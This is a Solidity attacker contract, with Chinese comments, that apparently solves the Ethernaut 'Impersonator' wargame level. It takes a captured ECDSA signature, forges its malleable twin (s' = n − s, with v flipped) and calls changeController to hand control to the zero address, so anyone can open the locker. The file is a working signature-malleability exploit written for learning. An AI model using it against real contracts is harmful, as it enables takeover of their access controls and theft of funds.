// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Impersonator, ECLocker} from "../../src/ethernaut/32_Impersonator/Impersonator.sol";

contract Impersonator_Attacker {
	address player;
	Impersonator coreInst;
	ECLocker lockerZero;
	
	constructor(Impersonator coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
		lockerZero = coreInst.lockers(0);
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 需要任何人，都能调用`function open(uint8 v, bytes32 r, bytes32 s)`成功，即，随意填写 v、r、s 参数。
		// 则，需要任何人都能调用`_address == controller`成功。
		// 所以，必须使得`controller == address(0)`
		// 需要使用`function changeController(uint8 v, bytes32 r, bytes32 s, address newController)`，来篡改为`address(0)`
		
		// 在以太坊浏览器上，可以看到类似的签名值：
		// 0x08df0e0cb1e3d74c28284b28c5f729a2777cbc1e43b5a0457e76e127db5a202f0c21d0cf89c7eaf7eefcf347fbab412269e434623adb609345969a919e92474f000000000000000000000000000000000000000000000000000000000000001c
		// 拆分如下：
		// 08df0e0cb1e3d74c28284b28c5f729a2777cbc1e43b5a0457e76e127db5a202f --> r
		// 0c21d0cf89c7eaf7eefcf347fbab412269e434623adb609345969a919e92474f --> s
		// 000000000000000000000000000000000000000000000000000000000000001c --> v = 28
		
		// 对于每个签名(v, r, s)，都有一个对应的“仿冒者”签名(v', r, s')
		// s' = n - s
		// 最终，达成`让仿冒者签名值，也真实生效`。
		// 这就是`签名的延展性攻击`。
		
		// 捕获原始签名值
		bytes memory signature = abi.encode(
			[
				uint256(0x08df0e0cb1e3d74c28284b28c5f729a2777cbc1e43b5a0457e76e127db5a202f),
				uint256(0x0c21d0cf89c7eaf7eefcf347fbab412269e434623adb609345969a919e92474f),
				uint256(0x000000000000000000000000000000000000000000000000000000000000001c)
			]
		);
		
		// N的固定值
		bytes32 N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
		bytes32 r;
		bytes32 s;
		bytes32 v;
		uint8 v_uint8;
		
		assembly {
			r := mload(add(signature, 0x20))
			s := mload(add(signature, 0x40))
			v :=  mload(add(signature, 0x60))
		}
		v_uint8 = uint8(v[31]);
		
		console.logBytes32(r);
		console.logBytes32(s);
		console.logBytes32(v);
		console.log(uint256(v_uint8));
		
		bytes32 new_s = bytes32(uint256(N) - uint256(s));
		uint8 new_v = (v_uint8 == 27 ? 28 : 27);
		
		// 调用changeController将控制器修改为零地址
		lockerZero.changeController(new_v, r, new_s, address(0));
	}
}
